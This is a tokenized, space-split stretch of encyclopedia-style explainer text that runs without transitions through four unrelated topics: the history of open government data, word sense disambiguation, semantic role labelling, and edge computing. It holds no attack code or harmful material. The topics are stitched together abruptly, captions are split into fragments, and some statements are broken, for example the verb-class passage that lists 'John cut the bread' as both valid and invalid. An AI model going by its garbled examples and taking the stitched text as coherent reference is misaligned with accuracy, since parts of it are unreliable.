Thirty individuals meet in Sebastopol , California to discuss open public data .
Many of them come from the culture of free and open source software movement .
This event can be seen as a convergence of many past US and European efforts in open data .
They identify eight principles : complete , primary , timely , accessible , machine - processable , non - discriminatory , non - proprietary , and license - free .
At a TED talk , Tim Berners - Lee gets people to chant " Raw data , now .
" He makes reference to Rosling 's talk of 2006 and adds that it 's important to link data from different sources .
He calls this Linked Data .
He mentions DBpedia , which takes data from Wikipedia and connects them up .
The US government launched Data.gov with 47 datasets .
About five years later , it has about 100,000 datasets .
Many governments attempt to open their data to the public , but there are concerns about privacy .
It 's only in 2015 that privacy principles have become an essential part of discussions on open data .
It 's become clear that providing raw data is not always possible .
Governments must balance potential benefits to the public against the privacy rights of individuals .
Guillermo Moncecchi of Open Knowledge International writes that beyond transparency , open data is also about building a public data infrastructure .
While the focus during 2007 - 2009 was on data transparency , during 2010 - 2016 the focus shifted to public infrastructure .
Consider data about street light locations .
Citizens can use this data to solve problems on their own .
Metrics changed from the number of published datasets to APIs and reuse .
Top five ranking positions of open data from governments .
Source : OKFN 2017 .
Open Knowledge Foundation publishes the Global Open Data Index ( GODI ) .
This shows that only 38 % of government data is really open .
This is based on Open Definition 2.1 .
A later update available online shows that only 166 of 1410 datasets ( 11 % ) are open .
The report gives a number of recommendations to governments and policy makers to make their data more open .
Open Data Charter replaces their earlier ambitious call of " open by default " with a more practical " publish with purpose " .
Rather than getting governments to open up as much data as possible quickly , the intent is to get them to take small steps in that direction .
Governments can open datasets with a clear view of tangible benefits to citizens .
Open data powers this visualization of traffic congestion .
Source : Tjukanov 2018a .
Using open data exposed by Here.com via an API , Tjukanov uses visualization to show average traffic congestion in many of the world 's largest cities .
Interesting patterns emerge , plotted within a radius of 50 km from the city center .
He uses QGIS , an open source GIS platform .
This is an example of the value that open data plus open source can unlock .
Organograms of UK government departments .
Source : Cook 2020 .
Using open data collated by the Institute for Government from data.gov.uk , Peter Cook produces interesting organograms , which are visualizations of organization structures .
He does this for many UK government departments .
Clicking on individual data points shows names , job titles , salary range and other details .
This sort of data has been available ( though patchy ) since March 2011 .
Different senses of four words .
Source : Liu et al .
2004 , table 3 .
Many words have multiple meanings or senses .
For example , the word bass has at least eight different senses .
The correct sense can be established by looking at the context of use .
This is easy for humans because we know from experience how the world works .
Word Sense Disambiguation ( WSD ) is about enabling computers to do the same .
WSD involves the use of syntax , semantics and word meanings in context .
It 's therefore a part of computational lexical semantics .
WSD is considered an AI - complete problem , which means that it 's as hard as the most difficult problems in AI .
Both supervised and unsupervised algorithms are available .
The term Word Sense Induction ( WSI ) is sometimes used for unsupervised algorithms .
In the 2010s , the word embedding became popular .
Such embeddings used with neural network models represent the current state - of - the - art models for WSD .
Could you explain Word Sense Disambiguation with an example ?
In English - to - Spanish machine translation , we need the correct sense of ' bass ' .
Source : Jurafsky 2015 , slide 9 .
Consider the sentences " I can hear bass sounds " and " They liked grilled bass " .
The meaning or sense of the word ' bass ' is low frequency tones or a type of fish respectively .
The word alone is not sufficient to determine the correct sense .
When we consider the word in the context of surrounding words , the sense becomes clear .
Using WSD , the second sentence can be sense - tagged as " They like / ENJOY grilled / COOKED bass / FISH " .
Context comes from the words ' sounds ' or ' grilled ' .
It 's also helpful to know that these collocated words are noun and adjective respectively .
One comes after ' bass ' and the other comes before ' bass ' .
These syntactic relations give additional information .
In general , pre - processing steps such as POS tagging and parsing help WSD .
A difficult example is " the astronomer married the star " .
There is no universally agreed sense of a word .
Senses can also vary with domains .
WSD also relies on knowledge .
Without knowledge , it 's impossible to determine the correct sense .
It 's expensive to build knowledge resources .
Back in the 1990s , this was seen as the knowledge acquisition bottleneck .
Could you mention some applications for WSD ?
WSD applied to image retrieval for the word ' cup ' .
Source : Saenko and Darrell 2009 , fig .
1 .
WSD is usually seen as an " intermediate task " , as a means to an end .
Obtaining the correct word sense is helpful in many NLP applications .
Exactly how WSD is used is application specific .
Here are some examples : Machine Translation : An English translation of the French word ' grille ' can be railings , bar , grid , scale , schedule , etc .
Correct word sense disambiguation is therefore necessary .
Information Retrieval : When searching for judicial references to the word ' court ' , we wish to avoid matches pertaining to royalty .
Thematic Analysis : Themes are identified based on word distribution , but we include only words of the relevant sense .
Grammatical Analysis : In POS tagging or syntactic analysis , WSD is useful .
In the French sentence " L'étagère plie sous les livres " , livres refers to ' books ' and not ' pounds ' .
Speech Processing : WSD helps in obtaining the correct phonetization in speech synthesis .
Text Processing : For inserting dictionary , WSD helps with correcting the French word ' comte ' to ' comté ' .
For case changes , WSD corrects ' HE READ THE TIMES ' to ' He read the Times ' .
To " Wikify " online documents , WSD helps .
What are some essential terms to know about word senses ?
Example noun and verb senses in WordNet .
Source : Jurafsky and Martin 2009a , fig .
19.2 - 19.3 .
Consider the word ' bank ' .
This can refer to a financial institution or a sloping mound .
These two senses of the same word are unrelated but they look and sound the same .
We call them homonyms .
The sense of relationship is called homonymy .
Typically , homonyms have different origins and different dictionary entries .
A bank can also refer to the building that houses the financial institution .
These senses are semantically related .
The sense relation is called polysemy .
Synonyms are different words with the same or nearly the same meaning .
Antonyms are words with opposite meanings .
Consider two words in which one is a subclass of the other , a type of relation , such as mango and fruit .
Mango is a hyponym for fruit .
Fruit is a hypernym of mango .
Consider two words that form a part - whole relationship , such as wheel and car .
A wheel is a meronym of a car .
A car is a holonym for a wheel .
Which are the essential elements for doing WSD ?
A cooccurence graph for the word ' bar ' .
Source : Navigli 2009 , fig .
7 .
WSD requires two main sources of information : context and knowledge .
Context is established from neighbouring words and the domain of discourse .
Sense - tagged corpora provide knowledge , leading to data - driven or corpus - based WSD .
Use of lexicons or encyclopaedia leads to knowledge - driven WSD .
We also need to know possible word senses .
These can be enumerative , with WordNet being an example .
A generative model underspecifies senses until context is considered .
Rules generate senses .
These rules capture regularities in the creation of senses .
In the lexical sample task , WSD is applied to a sample of pre - selected words .
A Supervised ML approach is possible based on hand - labelled corpus .
In the all - words task , WSD is applied to all words , for which supervised ML approach is not practical .
Dictionary - based approaches or bootstrapping techniques are more suitable .
A bag - of - words approach can be used for context .
To preserve word ordering , collocation can be used when forming feature vectors .
Such a vector might include the word 's root form and its POS .
Syntactic relations , distance from target and selectional preferences are other approaches .
Could you describe some algorithms for WSD ?
The Simplified Lesk Algorithm looks at overlapping words .
Source : Jurafsky 2015 , slide 32 .
A simple supervised approach is to use a naive Bayes classifier .
We maximize the probability of word sense given a feature vector .
The problem is simplified by using Bayes ' Rule and assuming features are independent of one another .
Another approach is decision list classifier .
The Corpus Lesk algorithm uses a sense - tagged corpus .
We also use the definition or gloss of each sense from a dictionary .
Examples from the corpus and the gloss become the signature of the sense .
Then we compute the number of overlapping words between the signature and the context .
Inverse Document Frequency ( IDF ) weighting is applied to discount function words ( the , of , etc .
) .
The simplified Lesk algorithm uses only gloss for signature and does n't use weights .
For evaluation , most frequent sense is used as a baseline .
Frequencies can be taken from a sense - tagged corpus such as SemCor .
The Lesk algorithm is also a suitable baseline .
Senseval and SemEval have standardized sense evaluation .
How are word embeddings relevant to the problem of WSD ?
F1 scores on different all - word WSD datasets .
Source : Iacobacci et al .
2016 , table 3 .
Schütze ( 1998 ) proposed the use of words vectors and context vectors .
These are large dimensional vectors and often sparse .
To make them practical for computation , Singular Value Decomposition ( SVD ) reduces the number of dimensions .
Within such a vector space model , Latent Semantic Analysis ( LSA ) helps to determine semantic relations .
Word embedding is a modern alternative .
Word embeddings were proposed by Bengio et al .
( 2003 ) .
These are low - dimensional dense vectors that capture semantic information .
However , words with multiple senses are reduced to a single vector .
This is not directly useful for WSD .
To overcome this , Trask et al .
( 2015 ) proposed sense2vec , where representations are of senses , not words .
Sense2vec improved the accuracy of other NLP tasks such as named entity recognition and neural dependency parsing .
Iacobacci et al .
( 2016 ) explored the direct use of word embeddings .
Using It Makes Sense ( IMS ) framework along with Word2vec , they improved F1 scores on various WSD datasets .
Word embeddings of a target word and its surrounding words are converted into " sense vectors " using various methods : concatenation , average , fractional decay , exponential decay .
What are some neural network approaches to WSD ?
Seq2seq architecture with multiple attentions .
Source : Ahmed et al .
2018 , fig .
3 .
Neural network approaches to WSD have become popular in the 2010s .
Wiriyathammabhum et al .
( 2012 ) applied Deep Belief Networks ( DBN ) .
They pre - trained the hidden layers using various knowledge sources , layer by layer .
They then used a separate fine tuning step for better discrimination .
We lose sequential and syntactic information when averaging word vectors .
Instead , Yuan et al .
( 2016 ) proposed a semi - supervised LSTM model with label propagation .
To capture contexts from both sides , Kågebäck and Salomonsson ( 2016 ) applied Bidirectional LSTM .
Many models consider only context .
Knowledge sources such as WordNet are ignored .
Gloss - Augmented WSD ( GAS ) considers both context and glosses ( sense definitions ) and uses BiLSTM .
One attention - based approach is an encoder - decoder model with multiple attentions to different linguistic features .
Another is GlossBERT .
It uses BERT , encodes context - gloss pairs of all possible senses , and treats WSD as a sentence - pair classification problem .
What are some resources to do WSD ?
It Makes Sense ( IMS ) : a flexible framework for WSD .
Source : Zhong and Ng 2010 , fig .
1 .
A number of datasets and sense - annotated corpora are available to train WSD models : Senseval and SemEval tasks ( all - words , lexical sample , WSI ) , AIDA CoNLL - YAGO , MASC , SemCor , and WebCAGe .
Likewise , word sense inventories include WordNet , TWSI , Wiktionary , Wikipedia , FrameNet , OmegaWiki , VerbNet , and more .
These are supported by the modular Java framework DKPro WSD .
UKB is an open - source toolkit that can be used for knowledge - based WSD .
It should be used with optimal default parameters .
In January 2017 , Google released word sense annotations on MASC and SemCor datasets .
Senses are from the New Oxford American Dictionary ( NOAD ) .
NOAD senses are also mapped to WordNet .
ACLWiki has curated a list of useful WSD resources .
This includes papers , inventories , annotated corpora and software .
Ruder captures the current state of the art in WSD with links to relevant papers .
Papers With Code also maintains a list of recent papers on WSD .
Warren Weaver considers the task of using computers to translate text from one language to another .
He recognizes the importance of context and meaning .
He makes references to cryptography and statistical semantic studies as possible approaches to obtaining the correct meaning of a word .
Weaver also notes that a word mostly has only one meaning within a particular domain .
Oswald and Lawson propose microglossaries for machine translation .
These are glossaries assembled for a particular domain .
Through the 1950s , researchers produced many such domain - specific glossaries to aid machine translation .
For example , a microglossary for mathematics would define ' triangle ' as a geometric shape and not as a musical instrument .
Erwin Reifler defines what he calls semantic coincidences between a word and its context .
He also notes that syntactic relations can be used to disambiguate .
For example , the word ' kept ' can have an object that 's gerund ( He kept eating ) , adjectival phrase ( He kept calm ) , or noun phrase ( He kept a record ) .
Masterman makes use of synonyms , near synonyms and associated words from Roget 's Thesaurus .
She gives the example of a " flowering plant " .
Using the thesaurus , we can determine that ' vegetable ' is the only common sense for the words ' flowering ' and ' plant ' .
This is therefore the correct sense of the word ' plant ' in this context .
Madhu and Lytle propose the use of what they call the Figure of Merit .
This is a probabilistic measure that 's useful when grammatical structure alone is unable to disambiguate .
They focus on scientific and engineering literature and identify ten groups .
The group or context is determined using words with a single meaning .
Then the most probable meaning of words with multiple meanings is selected given the context .
Paradoxically , this is also the time when interest in machine translation declines .
An example is semantic network from WordNet .
Source : Navigli 2009 , fig .
3 .
In the 1970s , some notable approaches included Semantic Networks of Quillian and Simmons ; Preferential Semantics of Wilks ; word - based understanding of Riesbeck .
Early semantic networks can be traced to the late 1950s .
Lesk uses a machine - readable dictionary ( MRD ) for WSD .
In general , the 1980s saw large - scale lexical resources ( such as WordNet ) for automated knowledge extraction .
This is also when the focus shifts from linguistic theories to empirical methods .
Network topology for the word ' pen ' .
Source : Véronis and Ide 1990 , fig .
2 .
The use of neural networks had been suggested in the early 1980s but was limited to a few words and hand - coded .
Véronis and Ide extend this idea by using a machine - readable Collins English Dictionary .
A network is formed using dictionary entries and words used to define them .
Word nodes activate sense nodes .
Feedback allows competing senses to inhibit one another .
Aligning sentences between English and French to aid WSD .
Source : Brown et al .
1991 , fig .
1 .
Brown et al .
show that it 's possible to disambiguate by aligning sentences in two languages .
A word in one language might translate into different words in another language , each with a unique sense .
In 1992 , Gale et al .
extend this idea by using Canadian Hansards ( parliamentary debates ) that are available in more than one language .
This avoids expensive hand - labelled corpus .
Unsupervised WSD for the word ' plant ' .
Source : Yarowsky 1995 , fig .
1 - 3 .
Supervised WSD algorithms have the problem of requiring sense - annotated corpora , which is expensive and laborious to create .
Yarowsky proposes an unsupervised WSD algorithm .
The algorithm uses two useful constraints : one sense per collocation , one sense per discourse .
It 's a bootstrapping procedure that seeds a small number of sense annotations .
The algorithm then determines and iteratively improves on the senses for other occurrences of the word .
An example is to disambiguate ' plant ' , which can be about plant life or a manufacturing plant .
Word vector space and clustering for WSD .
Source : Schütze 1998 , fig .
2 - 3 .
Schütze proposes a vector space approach to WSD via clustering .
Senses are seen as clusters of similar contexts .
A sense of a particular word is the cluster to which it 's closest .
Since the technique is unsupervised , senses are induced by a corpus .
Word vectors are calculated using cooccurrences .
Word vectors are sparse but context vectors are dense .
The dimensions of both vectors are reduced using Singular Value Decomposition ( SVD ) .
Mihalcea and Moldovan make use of WordNet for WSD .
They rank different senses using WordNet 's semantic density for a word - pair and web mining for word pair cooccurrences .
In 2004 , Peter Turney also employed web mining to calculate cooccurrence probabilities that are used to generate semantic features for WSD .
This decade sees an increasing use of word embeddings and neural network models for WSD .
Some of these include Gloss - Augmented WSD ( GAS ) , GlossBERT , and the use of BiLSTM .
Evolution of word senses for the word ' game ' .
Source : Ramiro et al .
2018 , fig .
5 .
Ramiro et al .
study the evolution of word senses .
They note that cognitive efficiency drives this evolution through a process called nearest - neighbour chaining .
For new word senses , reuse of existing words ( polysemy ) is more common than new word forms .
For the verb ' loaded ' , the semantic roles of other words and phrases in the sentence are identified .
Source : Lascarides 2019 , slide 10 .
In linguistics , predicate refers to the main verb in the sentence .
Predicate arguments .
The role of Semantic Role Labelling ( SRL ) is to determine how these arguments are semantically related to the predicate .
Consider the sentence " Mary loaded the truck with hay at the depot on Friday " .
' Loaded ' is the predicate .
Mary , truck and hay have their respective semantic roles of loader , bearer and cargo .
We can identify additional roles of location ( depot ) and time ( Friday ) .
The job of SRL is to identify these roles so that downstream NLP tasks can " understand " the sentence .
SRL is also known by other names such as thematic role labelling , case role assignment , or shallow semantic parsing .
Why do we need semantic role labelling when there 's already parsing ?
A TreeBanked sentence is also PropBanked with semantic role labels .
Source : Palmer 2013 , slide 6 .
Often , an idea can be expressed in multiple ways .
Consider these sentences that all mean the same thing : " Yesterday , Kristina hit Scott with a baseball " ; " Scott was hit by Kristina yesterday with a baseball " ; " With a baseball , Kristina hit Scott yesterday " ; " Kristina hit Scott with a baseball yesterday " .
Either constituent or dependency parsing will analyze these sentences syntactically .
But syntactic relations do n't necessarily help in determining semantic roles .
One way to understand SRL is via an analogy .
In image captioning , we extract the main objects in the picture , how they are related and the background scene .
This is precisely what SRL does but from unstructured input text .
Such an understanding goes beyond syntax .
However , parsing is not completely useless for SRL .
In a traditional SRL pipeline , a parse tree helps in identifying the predicated arguments .
But SRL performance can be impacted if the parse tree is wrong .
This has motivated SRL approaches that completely ignore syntax .
However , many research papers through the 2010s have shown how syntax can be effectively used to achieve state - of - the - art SRL .
What are some applications of SRL ?
SRL is helpful for question answering .
Source : Yih and Toutanova 2006 , slide 2 .
SRL is useful in any NLP application that requires semantic understanding : machine translation , information extraction , text summarization , question answering , and more .
For example , predicates and heads of roles help in document summarization .
For information extraction , SRL can be used to construct extraction rules .
SRL can be seen as answering " who did what to whom " .
Obtaining semantic information thus benefits many downstream NLP tasks such as question answering , dialogue systems , machine reading , machine translation , text - to - scene generation , and social network analysis .
Historically , early applications of SRL include Wilks ( 1973 ) for machine translation ; Hendrix et al .
( 1973 ) for question answering ; Nash - Webber ( 1975 ) for spoken language understanding ; and Bobrow et al .
( 1977 ) for dialogue systems .
Which are the essential roles used in SRL ?
Thematic roles with examples .
Source : Jurafsky 2015 , slide 10 .
One of the oldest models is called Thematic Roles , which dates back to Pāṇini from about 4th century BC .
Roles are assigned to subjects and objects in a sentence .
Roles are based on the type of event .
For example , if the verb is ' breaking ' , roles would be breaker and broken things for subject and object respectively .
Some examples of thematic roles are agent , experiencer , result , content , instrument , and source .
There 's no well - defined universal set of thematic roles .
A modern alternative from 1991 is proto - roles that defines only two roles : Proto - Agent and Proto - Patient .
Using heuristic features , algorithms can say if an argument is more agent - like ( intentionality , volitionality , causality , etc .
) or patient - like ( undergoing change , affected by , etc .
) .
How are VerbNet , PropBank and FrameNet relevant to SRL ?
Comparing PropBank and FrameNet representations .
Source : Jurafsky 2015 , slide 37 .
Verbs can realize the semantic roles of their arguments in multiple ways .
This is called verb alternations or diathesis alternations .
Consider " Doris gave the book to Cary " and " Doris gave Cary the book " .
The verb ' gave ' realizes THEME ( the book ) and GOAL ( Cary ) in two different ways .
VerbNet is a resource that groups verbs into semantic classes and their alternations .
PropBank contains sentences annotated with proto - roles and verb - specific semantic roles .
Arguments to verbs are simply named Arg0 , Arg1 , etc .
Typically , Arg0 is the Proto - Agent and Arg1 is the Proto - Patient .
Being also verb - specific , PropBank records roles for each sense of the verb .
For example , for the word sense ' agree.01 ' , Arg0 is the Agreer , Arg1 is Proposition , and Arg2 is other entity agreeing .
An idea can be expressed with similar words such as increased ( verb ) , rose ( verb ) , or rise ( noun ) .
PropBank may not handle this very well .
FrameNet is another lexical resource defined in terms of frames rather than verbs .
For every frame , core roles and non - core roles are defined .
Frames can be inherited from or causally linked to other frames .
What 's the typical SRL processing pipeline ?
SRL involves predicate identification , predicate disambiguation , argument identification , and argument classification .
Argument identification is aided by fully parse trees .
However , in some domains , such as biomedical , fully parse trees may not be available .
In such cases , chunking is used instead .
When a full parse is available , pruning is an important step .
Using heuristic rules , we can discard constituents that are unlikely arguments .
In fact , full parsing contributes most to the pruning step .
Pruning is a recursive process .
If each argument is classified independently , we ignore interactions among arguments .
A better approach is to assign multiple possible labels to each argument .
Then we can use global context to select the final labels .
This step is called reranking .
Which are the main approaches to SRL ?
Early SRL systems were rule - based , with rules derived from grammar .
Since the mid-1990s , statistical approaches have become popular due to FrameNet and PropBank that provided training data .
Classifiers could be trained from feature sets .
A set of features might include the predicate , constituent phrase type , head word and its POS , predicate - constituent path , voice ( active / passive ) , constituent position ( before / after predicate ) , and so on .
SRL has traditionally been a supervised task but adequate annotated resources for training are scarce .
Research from early 2010s focused on inducing semantic roles and frames .
There 's also been research on transferring the SRL model to low - resource languages .
One novel approach trains a supervised model using question - answer pairs .
Given a sentence , even non - experts can accurately generate a number of diverse pairs .
We therefore do n't need to compile a pre - defined inventory of semantic roles or frames .
Which are the neural network approaches to SRL ?
Architecture and details of LISA for SRL .
Source : Strubell et al .
2018 , fig .
1 - 2 .
Neural network approaches to SRL have the state - of - the - art since the mid-2010s .
We note a few of them .
Roth and Lapata ( 2016 ) used the dependency path between the predicate and its argument .
Words and relations along the path are represented and input to an LSTM .
Another input layer encodes binary features .
A hidden layer combines the two inputs using RLUs .
Finally , there 's a classification layer .
He et al .
( 2017 ) used deep BiLSTM with highway connections and recurrent dropout .
With word - predicate pairs as input , output via softmax are the predicted tags that use BIO tag notation .
GloVe input embeddings were used .
Another research group also used BiLSTM with highway connections but used CNN+BiLSTM to learn character embeddings for the input .
Since 2018 , self - attention has been used for SRL .
Strubell et al .
( 2018 ) applied it to train a model to jointly predict POS tags and predicates , do parsing , attend to syntactic parse parents , and assign semantic roles .
One of the self - attention layers attends to syntactic relations .
Shi and Lin used BERT for SRL without using syntactic features and still got state - of - the - art results .
Indian grammarian Pāṇini authors Aṣṭādhyāyī , a treatise on Sanskrit grammar .
It records rules of linguistics , syntax and semantics .
His work was discovered only in the 19th century by European scholars .
His work identifies semantic roles under the name of kāraka .
In what may be the beginning of modern thematic roles , Gruber gives the example of motional verbs ( go , fly , swim , enter , cross ) and states that the entity conceived of being moved is the theme .
The theme is syntactically and semantically significant to the sentence and its situation .
A related development of semantic roles is due to Fillmore ( 1968 ) .
Dowty notes that all throughout the 1980s , new thematic roles were proposed .
There 's no consensus even on the common thematic roles .
A large number of roles results in role fragmentation and inhibits useful generalizations .
As an alternative , he proposes Proto - Agent and Proto - Patient based on verb entailments .
The argument may be either or both of these to varying degrees .
He then considers both fine - grained and coarse - grained verb arguments , and ' role hierarchies ' .
Essentially , Dowty focuses on the mapping problem , which is about how syntax maps to semantics .
Beth Levin published English Verb Classes and Alternations .
This work classifies over 3,000 verbs by meaning and behaviour .
She makes a hypothesis that a verb 's meaning influences its syntactic behaviour .
She then shows how identifying verbs with similar syntactic structures can lead us to semantically coherent verb classes .
For example , " John cut the bread " and " Bread cuts easily " are valid .
But ' cut ' ca n't be used in these forms : " The bread cut " or " John cut the bread " .
FrameNet workflows , roles , data structures and software .
Source : Baker et al .
1998 , fig .
3 .
FrameNet has launched as a three - year NSF - funded project .
Semantic information is manually annotated on large corpora along with descriptions of semantic frames .
Conceptual structures are called frames .
Role names are called frame elements .
For example , in the transportation frame , drivers , vehicles , riders , and cargo are possible frame elements .
Kipper et al .
at the University of Pennsylvania create VerbNet .
This is a verb lexicon that includes syntactic and semantic information .
In 2004 and 2005 , other researchers extended the Levin classification with more classes .
In 2008 , Kipper et al .
use Levin - style classification on PropBank with 90 % coverage , thus providing a useful resource for researchers .
Just as Penn Treebank has enabled syntactic parsing , the Propositional Bank or PropBank project is proposed to build a semantic lexical resource to aid research into linguistic semantics .
The idea is to add a layer of predicate - argument structure to the Penn Treebank II corpus .
By 2005 , this corpus was complete .
It uses VerbNet classes .
In time , PropBank becomes the preferred resource for SRL since FrameNet is not representative of the language .
Making use of FrameNet , Gildea and Jurafsky apply statistical techniques to identify semantic roles filled by constituents .
Their work also studies different features and their combinations .
They also explore how syntactic parsing can integrate with SRL .
Other techniques explored are automatic clustering , WordNet hierarchy , and bootstrapping from unlabelled data .
In the coming years , this work will influence greater application of statistics and machine learning to SRL .
Swier and Stevenson note that SRL approaches are typically supervised and rely on manually annotated FrameNet or PropBank .
They propose an unsupervised " bootstrapping " method .
They start with unambiguous role assignments based on a verb lexicon .
In further iterations , they use the probability model derived from current role assignments .
This may well be the first instance of unsupervised SRL .
Punyakanok et al .
apply full syntactic parsing to the task of SRL .
They show that this impacts most during the pruning stage .
Based on CoNLL-2005 Shared Task , they also show that when outputs of two different constituent parsers ( Collins and Charniak ) are combined , the resulting performance is much higher .
They call this joint inference .
An example sentence with both syntactic and semantic dependency annotations .
Source : Johansson and Nugues 2008 , fig .
1 .
Johansson and Nugues note that state - of - the - art use of parse trees is based on constituent parsing and not much has been achieved with dependency parsing .
This is due to low parsing accuracy .
They use dependency - annotated Penn TreeBank from 2008 CoNLL Shared Task on joint syntactic - semantic analysis .
Using only dependency parsing , they achieve state - of - the - art results .
Researchers propose SemLink as a tool to map PropBank representations to VerbNet or FrameNet .
PropBank provides the best training data .
VerbNet excels in linking semantics and syntax .
FrameNet provides the richest semantics .
SemLink allows us to use the best of all three lexical resources .
For example , VerbNet can be used to merge PropBank and FrameNet to expand training resources .
By 2014 , SemLink will integrate OntoNotes sense groupings , WordNet and WSJ Tokens as well .
Shi and Mihalcea ( 2005 ) presented an earlier work on combining FrameNet , VerbNet and WordNet .
Confirmation that Proto - Agent and Proto - Patient properties predict subject and object respectively .
Source : Reisinger et al .
2015 , fig .
4 - 5 .
Inspired by Dowty 's work on proto roles in 1991 , Reisinger et al .
produce a large - scale corpus - based annotation .
They use PropBank as the data source and use the Mechanical Turk crowdsourcing platform .
They confirm that fine - grained role properties predict the mapping of semantic roles to argument position .
In 2016 , this work led to Universal Decompositional Semantics , which adds semantics to the syntax of Universal Dependencies .
Neural network architecture of the SLING parser .
Source : Ringgaard et al .
2017 , fig .
1 .
Google 's open sources SLING that represents the meaning of a sentence as a semantic frame graph .
Unlike a traditional SRL pipeline that involves dependency parsing , SLING avoids intermediate representations and directly captures semantic annotations .
It uses an encoder - decoder architecture .
Simple lexical features ( raw words , suffix , punctuation , etc .
) are used to represent input words .
The Decoder computes the sequence of transitions and updates the frame graph .
The system is based on the frame semantics of Fillmore ( 1982 ) .
SpanGCN encoder : red / black lines represent parent - child / child - parent relations respectively .
Source : Marcheggiani and Titov 2019 , fig .
2 .
While dependency parsing has become popular lately , it 's really constituents that act as predicate arguments .
Marcheggiani and Titov use a Graph Convolutional Network ( GCN ) in which graph nodes represent constituents and graph edges represent parent - child relations .
BiLSTM states represent starting and end tokens of constituents .
Their earlier work from 2017 also used GCN but to model dependency relations .
Network topology showing edge nodes and devices .
Source : Alibaba Cloud 2020 .
With the growth of the Internet of Things ( IoT ) , billions of devices are generating huge amounts of data .
But to store or analyze all that data in real time is almost impossible .
This is where edge computing becomes relevant .
With edge computing , we process data closer to the source , such as an IoT device , an IoT gateway , an edge server , a smartphone , or a user 's computer .
The idea is to move intelligence to the edge and let edge nodes / devices do real - time analytics .
This reduces application latency and saves network bandwidth .
The architecture is distributed , as opposed to centralizing all processing in the cloud .
It minimizes long - distance client - sever communication .
Gartner defines edge computing as part of a distributed computing topology where information processing is located close to the edge , where things and people produce or consume that information .
Could you explain edge computing with an example ?
Consider a building security application that has many networked cameras .
Cameras capture high - definition video streams .
Assume that the cameras are ' dumb ' .
They simply capture and transmit raw video to a cloud server .
The cloud server analyzes the video streams for motion detection .
We note two problems in this scenario : strain on network bandwidth and strain on the cloud server that has to process videos from multiple cameras .
With edge computing , we enable each camera to run motion detection locally .
Cameras are equipped with some storage and sufficient computer power to do this .
Cameras have now become ' smart ' .
Only important video segments are sent to the cloud for storage or deeper analysis .
Both network bandwidth and cloud storage / processing are saved .
In turn , the cloud server can now support many more cameras .
What are some use cases of edge computing ?
In autonomous driving , if a pedestrian crosses the road , the vehicle may have to brake immediately .
Waiting for the cloud to make this decision may prove fatal .
Vehicles can also communicate directly with one another .
In healthcare , there are glucose monitors , fitness trackers , and other health - monitoring wearables .
Some monitoring devices locally analyze pulse data or sleep patterns without involving the cloud .
Edge computing enables timely care for remote patient monitoring , in - patient care and healthcare management in hospitals .
In smart factories , the lower latency due to edge computing enables more timely actions to control manufacturing workflows .
If analytics determines that a machine is about to fail , immediate action can be triggered to stop the machine .
Robots that process their own data will be more self - sufficient and reactive .
Edge computing enhances safety and efficiency on the factory floor .
In agriculture , connectivity is an issue at remote locations .
This leads to high investment towards fibre , microwave or satellite connections .
Edge computing presents a more cost - effective alternative .
Yield can be improved and food waste reduced .
Many more use cases exist in other sectors , such as consumer electronics , defence , telecom , oil & gas , energy , retail and finance .
Which are the main benefits of edge computing ?
Benefits of edge computing .
Source : Mhetre 2018 .
These are some benefits of edge computing : Reduced Latency : For delay - critical applications , the longer it takes to process data , the less relevant it becomes .
Edge computing avoids roundtrip delays .
Better Security : Centralized cloud systems are vulnerable to DDoS attacks .
Edge computing allows us to filter sensitive information locally .
Cost Savings : By retaining and processing data closer to source , edge computing saves on connectivity costs .
Data can be categorized and handled suitably : stored locally , stored on cloud , or processed and discarded .
Redundant storage is avoided .
Data management solutions also cost less .
Greater Reliability : Connectivity to the cloud is never perfect .
Edge devices / nodes can deal with temporary outages by storing or processing data locally .
Scalability : While cloud infrastructure is built for scalability , data still needs to be sent to datacentres and stored centrally .
Edge computing complements this by scaling in a distributed manner .
Interoperability : Edge nodes can act as intermediaries to interface legacy and modern machines .
Which are the technologies that enable computing at the edge of networks ?
Cloud computing itself is an enabler for edge computing .
Edge computing does n't replace cloud computing .
They complement each other .
Based on application requirements , engineers must decide what data is best processed at the edge and what should go into the cloud .
Fog computing extends the cloud while also being closer to edge devices .
With fog computing , we place compute and storage in the most logical and efficient location between the cloud and the origin of data .
As part of the fog computing infrastructure , there are cloudlets and micro datacentres , which are simply edge servers clustered together to serve local storage or compute requirements .
They are suited for resource-intensive or interactive applications .
Multi - Access Edge Computing ( MEC ) is another enabler .
In cellular networks such as 4G/5 G , Radio Access Network ( RAN ) refers to the part that handles radio or wireless resources and communication .
MEC places computing and storage resources within the RAN to improve network efficiency and content delivery .
More generally , dropping the cost of electronics has brought more computed power to smaller devices .
Tools for real - time analytics , particularly on embedded devices , have also made edge computing possible .
How does edge computing differ from fog computing ?
Edge , fog and cloud computing .
Source : Sunkara 2019 .
Sensors , IoT devices and even IoT gateways are edge devices .
On the other hand , edge nodes belong to the fog network that interfaces edge devices with the cloud .
Therefore , fog computing depends on edge computing , but the reverse is not true .
For example , consider a train fitted with sensors .
A sensor giving engine status is processed locally on the train .
This is edge computing .
Suppose data from sensors attached to wheels and brakes needs to be aggregated over time and processed .
These can be sent to an edge node ( fog computing ) without saving that data in a centralized cloud .
There 's no universal definition of fog computing .
Some regard edge devices , edge nodes and even localized datacentres as belonging to the edge network , not preferring to use the terms fog computing or fog network .
Some others regard edge computing as any processing that 's close to the origin of data .
Any processing that happens on devices connected to the LAN or on LAN hardware is seen as fog computing .
Investing in fog computing makes sense if data has to be aggregated from many edge devices .
Which organizations are standardizing edge computing ?
Organizations involved in standardizing edge computing .
Source : Bravo and Bäckström 2020 .
Many organizations are standardizing edge computing .
There 's no single standard that currently covers all aspects of edge computing .
As early as 2017 , many organizations got interested in this space : The European Telecommunication Standards Institute ( ETSI ) , OpenFog Consortium , Open Networking Foundation ( ONF ) , Open Edge Computing and Facebook 's Telecom Infra Project ( TIP ) .
TM Forum , CNCF ( Cloud Native Computing Foundation ) , ONAP ( Open Network Automation Platform ) and LF Edge are also involved .
LF Edge is an umbrella organization within the Linux Foundation .
It hosts many edge - specific projects .
AECC ( Automotive Edge Computing Consortium ) and 5G - ACIA ( 5 G Alliance for Connected Industries and Automation ) focus on specific verticals that matter to them .
By 2020 , ETSI 's Multi - Access Edge Computing ( MEC ) will emerge as an important standard .
5 G Future Forum and Wireless Broadband Alliance are two organizations who have adopted MEC specifications .
What hardware is available to implement edge computing ?
Physical comparison of three development kits for edge computing .
Source : Yau 2019 .
Important considerations for edge computing hardware include processing power , power source , memory , wireless connectivity , variety of ports / interfaces , reliability and ruggedness .
